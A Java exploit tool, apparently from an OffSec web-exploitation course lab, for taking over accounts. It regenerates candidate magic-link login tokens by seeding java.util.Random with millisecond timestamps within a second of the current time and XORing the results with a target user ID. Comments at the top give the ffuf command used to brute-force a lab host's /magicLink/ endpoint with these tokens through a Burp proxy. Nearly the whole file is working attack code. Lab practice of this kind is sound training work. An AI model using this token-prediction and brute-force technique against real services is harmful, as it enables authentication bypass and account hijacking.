// Created list and used ffuf (proxied through burp to get cookie set)
// ffuf -u http://192.168.131.235:8888/magicLink/FUZZ -w tokens.txt -mr "Set-Cookie" -v -x http://172.21.80.1:8081
// Had to show response in browser to get token working for some reason

import java.util.Base64;
import java.util.Random;
import java.util.ArrayList;
import java.util.List;

public class TokenUtil {

    public static final String CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz";
    public static final String NUMBERS = "1234567890";
    public static final String SYMBOLS = "!@#$%^&*()";
    public static final String CHARSET = CHAR_LOWER + CHAR_LOWER.toUpperCase() + NUMBERS + SYMBOLS;

    public static final int TOKEN_LENGTH = 42;

    public static String createToken(int userId, long seed) {
        Random random = new Random(seed);
        StringBuilder sb = new StringBuilder();
        byte[] encbytes = new byte[TOKEN_LENGTH];

        for (int i = 0; i < TOKEN_LENGTH; i++) {
            sb.append(CHARSET.charAt(random.nextInt(CHARSET.length())));
        }

        byte[] bytes = sb.toString().getBytes();

        for (int i = 0; i < bytes.length; i++) {
            encbytes[i] = (byte) (bytes[i] ^ (byte) userId);
        }

        return Base64.getUrlEncoder().withoutPadding().encodeToString(encbytes);
    }

    public static void main(String[] args) {
        if (args.length < 1) {
            System.out.println("Usage: java com.offsec.awae.answers.util.TokenUtil <userId>");
            System.exit(1);
        }

        int userId;
        try {
            userId = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            System.out.println("Invalid userId. Please provide a valid integer.");
            System.exit(1);
            return;
        }

        // Get current time in milliseconds
        long currentTimeMillis = System.currentTimeMillis();

        // Generate tokens within 1000 milliseconds before and after the current time
        List<String> tokens = new ArrayList<>();
        for (long offset = -1000; offset <= 1000; offset++) {
            long seed = currentTimeMillis + offset;
            tokens.add(createToken(userId, seed));
        }

        // Output all generated tokens
        System.out.println("Generated tokens within ±1000ms:");
        for (String token : tokens) {
            System.out.println(token);
        }
    }
}
